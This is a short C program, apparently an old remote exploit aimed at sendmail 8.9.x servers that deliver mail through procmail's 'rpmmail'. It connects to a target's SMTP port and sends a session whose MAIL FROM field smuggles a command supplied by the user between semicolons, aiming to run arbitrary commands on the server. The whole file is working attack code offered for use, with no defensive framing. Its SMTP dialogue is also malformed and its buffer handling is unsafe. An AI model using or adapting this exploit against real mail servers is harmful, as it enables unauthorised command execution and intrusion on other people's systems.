/* sendmail! rpmmail (sendmail 8.9.3/8.9.1 procmail 3.10.x) -icesk */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
int
main (int argc, char **argv)
{
  struct sockaddr_in thaddr;
  struct hostent *hp;

  int unf;
  char buffer[1024];

  if (argc < 3)
    {
      printf ("useage: %s <host> <command>\n", argv[0]);
      exit (0);
    }
  if ((unf = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      printf ("err0r");
    }
  printf ("resolveing hostname...\n");
  if ((hp = gethostbyname (argv[1])) == NULL)
    {
      fprintf (stderr, "Could not resolve %s.\n", argv[1]);
      exit (1);
    }
  printf ("connecting...\n");
  thaddr.sin_family = AF_INET;
  thaddr.sin_port = htons (25);
  thaddr.sin_addr.s_addr = *(u_long *) hp->h_addr;
  bzero (&(thaddr.sin_zero), 8);


  if (connect (unf, (struct sockaddr *) &thaddr, sizeof (struct sockaddr)) == -1)
    {
      printf ("conction refused\n");
      exit (0);
    }
  printf ("sending string...");
  sprintf (buffer, "helo h1z03\r\nmail from: ;%s;@urban-a.net\r\nrcpt to: rpmmail\r\nFEAR\r\n.r\n", argv[2]);
  send (unf, buffer, strlen (buffer), 0);
  printf ("closeing connection... ");
  close (unf);
}
